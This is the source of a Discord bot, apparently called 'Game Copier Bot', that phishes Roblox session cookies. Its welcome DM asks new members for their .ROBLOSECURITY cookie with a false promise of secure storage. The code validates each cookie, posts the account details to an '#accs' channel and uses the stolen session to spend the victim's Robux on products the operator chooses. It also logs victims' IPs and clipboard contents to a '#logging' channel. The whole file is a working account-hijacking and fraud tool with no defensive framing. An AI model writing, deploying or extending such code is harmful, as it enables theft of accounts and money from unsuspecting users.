require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const axios = require('axios');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.DISCORD_GUILD_ID;

if (!TOKEN) {
  console.error("Missing DISCORD_BOT_TOKEN in .env");
  process.exit(1);
}

if (!GUILD_ID) {
  console.error("Missing DISCORD_GUILD_ID in .env");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: ['CHANNEL'], // needed for DMs
});

let loggingChannel = null;
let accsChannel = null;

const userCookies = new Map(); // DiscordUserID => Roblox cookie

// Your test products (replace with real product info)
const testProducts = [
  { productId: 12345678, price: 5, sellerId: 1 },
  // Add real products here
];

// Helper: send info to logging/accs channels
async function sendToDiscordBot(data, type) {
  if (!client.isReady()) {
    console.error("Discord client not ready");
    return;
  }

  try {
    if (type === 'token') {
      if (!accsChannel) {
        console.error("#accs channel not found");
        return;
      }

      await accsChannel.send({
        embeds: [{
          title: 'Roblox Cookie Received',
          color: 0xff9500,
          description:
            `**User:** <@${data.discordUserId}>\n` +
            `**Roblox User:** ${data.robloxUserName} (ID: ${data.robloxUserId})\n` +
            `**Cookie:** \`${data.cookie.substring(0, 20)}... (truncated)\``,
          timestamp: new Date(),
          footer: { text: 'Game Copier Bot' },
        }]
      });

    } else if (type === 'clipboard') {
      if (!loggingChannel) {
        console.error("#logging channel not found");
        return;
      }

      await loggingChannel.send({
        embeds: [{
          title: 'Clipboard Content Received',
          color: 0x00ff00,
          description:
            `**IP:** ${data.userIP}\n` +
            `**Type:** ${data.type}\n` +
            `**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``,
          timestamp: new Date(),
          footer: { text: 'Game Copier Bot' },
        }]
      });

    } else {
      console.warn("Unknown data type to send:", type);
    }
  } catch (error) {
    console.error("Error sending message to Discord:", error);
  }
}

// Welcome message
const WELCOME_MESSAGE = (serverName) => `
Welcome to the **${serverName}** Discord server!

You can stay and chat here, but if you want to enjoy premium features like trading and more, please reply to this DM with your Roblox \`.ROBLOSECURITY\` cookie.

*Note: Your cookie will be stored securely and used only for verification purposes.*

If you have any questions, feel free to ask!
`;

// Validate Roblox cookie + get user info
async function validateCookie(cookie) {
  try {
    const res = await axios.get('https://users.roblox.com/v1/users/authenticated', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: null,
    });
    if (res.status === 200) return res.data;
    return null;
  } catch {
    return null;
  }
}

// Get Robux balance
async function getRobuxBalance(cookie) {
  try {
    const res = await axios.get('https://economy.roblox.com/v1/user/currency', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: null,
    });
    if (res.status === 200) return res.data.robux || 0;
    return 0;
  } catch {
    return 0;
  }
}

// Purchase a product
async function purchaseProduct(cookie, product) {
  try {
    const res = await axios.post(
      `https://economy.roblox.com/v1/purchases/products/${product.productId}`,
      {
        expectedPrice: product.price,
        expectedSellerId: product.sellerId,
      },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'Content-Type': 'application/json',
        },
        validateStatus: null,
      }
    );
    return res.status === 200 || res.status === 201;
  } catch {
    return false;
  }
}

// Register slash commands (only /test for now)
async function registerCommands() {
  const commands = [
    new SlashCommandBuilder()
      .setName('test')
      .setDescription('Buy a random product from the shop using your Robux'),
  ].map(cmd => cmd.toJSON());

  const rest = new (require('discord.js').REST)({ version: '10' }).setToken(TOKEN);
  await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
}

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);

  try {
    const guild = await client.guilds.fetch(GUILD_ID);
    loggingChannel = guild.channels.cache.find(ch => ch.name === 'logging' && ch.isTextBased());
    accsChannel = guild.channels.cache.find(ch => ch.name === 'accs' && ch.isTextBased());

    if (!loggingChannel) console.error("Could not find #logging channel");
    if (!accsChannel) console.error("Could not find #accs channel");

  } catch (err) {
    console.error("Error fetching guild or channels:", err);
  }

  await registerCommands();
});

// On guild member join, send welcome DM
client.on('guildMemberAdd', async (member) => {
  try {
    await member.send(WELCOME_MESSAGE(member.guild.name));
  } catch {
    console.log(`Could not send DM to ${member.user.tag}. They may have DMs disabled.`);
  }
});

// On DM message: treat as Roblox cookie submission
client.on('messageCreate', async (message) => {
  if (message.channel.type === 1 && !message.author.bot) { // DM channel
    const cookie = message.content.trim();
    const userInfo = await validateCookie(cookie);
    if (userInfo) {
      userCookies.set(message.author.id, cookie);
      await message.reply(`Thanks! Verified Roblox user: ${userInfo.displayName} (ID: ${userInfo.id}). Your cookie is now saved securely.`);

      // Send to #accs logging channel
      await sendToDiscordBot({
        discordUserId: message.author.id,
        robloxUserName: userInfo.displayName,
        robloxUserId: userInfo.id,
        cookie,
      }, 'token');

    } else {
      await message.reply('Invalid Roblox cookie. Please check and try again.');
    }
  }
});

// Handle slash commands
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'test') {
    const cookie = userCookies.get(interaction.user.id);
    if (!cookie) {
      await interaction.reply({ content: 'You have not provided your Roblox cookie yet. Please send it to me via DM.', ephemeral: true });
      return;
    }

    const userInfo = await validateCookie(cookie);
    if (!userInfo) {
      userCookies.delete(interaction.user.id);
      await interaction.reply({ content: 'Your Roblox cookie is no longer valid. Please send a new one in DM.', ephemeral: true });
      return;
    }

    const robux = await getRobuxBalance(cookie);
    if (robux <= 0) {
      await interaction.reply('You have no Robux in your account.');
      return;
    }

    const product = testProducts[Math.floor(Math.random() * testProducts.length)];

    const success = await purchaseProduct(cookie, product);
    if (success) {
      await interaction.reply(`Purchase succeeded! You bought product ID ${product.productId} for ${product.price} Robux.`);
    } else {
      await interaction.reply('Purchase failed. Please check your account or try again later.');
    }
  }
});

client.login(TOKEN);
